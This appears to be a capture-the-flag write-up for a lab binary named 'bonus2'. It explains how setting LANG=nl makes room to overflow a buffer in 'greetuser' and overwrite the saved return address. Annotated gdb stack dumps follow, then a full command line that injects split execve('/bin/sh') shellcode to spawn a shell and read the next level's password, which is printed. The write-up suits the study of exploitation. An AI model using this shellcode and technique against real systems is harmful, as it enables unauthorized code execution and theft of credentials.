We want to make a buffer overflow to redirect eip to some address in the stack where we write a shellcode. \
The first place we thought to put the shellcode in was in the `greetuser` buffer. To overflow and write on the eip, we need to write at least `72` bytes (space reserved by esp) and then write `8` bytes to overwrite the eip. \
As our buffer can be at most `72` bytes long, we need some more bytes. With the default language value, we can only go to `76` bytes long, so we need more bytes. \
Setting the variable `LANG` to `nl` gives us `13` bytes more. `72 + 13 = 85` so we have enough space to overwrite the eip. \
The shellcode is `55` bytes long, so it wont fit into our first or our second parameter. We split it after making some adjustment, give the address of the stack to jump in, and `voila`:
```shell
(gdb) b *greetuser+147
Breakpoint 1 at 0x8048517

(gdb) r `python -c 'print "\x41"*3 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff"'` `python -c 'print "\xff/bin/sh" + "\x90"*11 + "\xf0\xf5\xff\xbf"*2'`
Breakpoint 1, 0x08048517 in greetuser ()

(gdb) x/48wx $esp
0xbffff5d0:	0xbffff5e0	0xbffff630	0x00000001	0x00000000
0xbffff5e0:	0x64656f47	0x64696d65	0x21676164	0xb7e50020
0xbffff5f0:	0xbfffff10	0xb7e338f8	0x00000002	0xb7ec38ee
0xbffff600:	0xbffff638	0xbffff680	0x00000000	0xbffff6cc
0xbffff610:	0xbffff6e8	0xb7ff26b0	0xbfffff10	0xb7f5d780
0xbffff620:	0xbfffff13	0xb7fff918	0xbffff6e8	0x08048630
0xbffff630:	0xeb414141	0x76895e1f	0x88c03108	0x46890746
...

(gdb) x/wx $ebp
0xbffff628:	0xbffff6e8

(gdb) ni
0x0804851c in greetuser ()

(gdb) x/48wx $esp
0xbffff5d0:	0xbffff5e0	0xbffff630	0x00000001	0x00000000
0xbffff5e0:	0x64656f47	0x64696d65	0x21676164	0x41414120
                                                |_ we start writing here so we write some A's to be aligned
0xbffff5f0:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
            |_ our shellcode that ends
0xbffff600:	0x4e8df389	0x0c568d08 |0xdb3180cd	0xcd40d889
                                   |                     ____
0xbffff610:	0xffdce880	0x622fffff |0x732f6e69	0x909090|68__|
                                   |____________________| here
0xbffff620:	0x90909090	0x90909090	0xbffff5f0	0xbffff5f0
                                    |_ the ebp  |_ the eip
...

(gdb) quit

bash$ LANG=nl ./bonus2 `python -c 'print "\x41"*3 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff"'` `python -c 'print "\xff/bin/sh" + "\x90"*11 + "\xf0\xf5\xff\xbf"*2'`
Goedemiddag! AAA�^�1��F�F
                         �
                          ���V
                               ̀1ۉ�@̀�����/bin/sh������������������� 
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

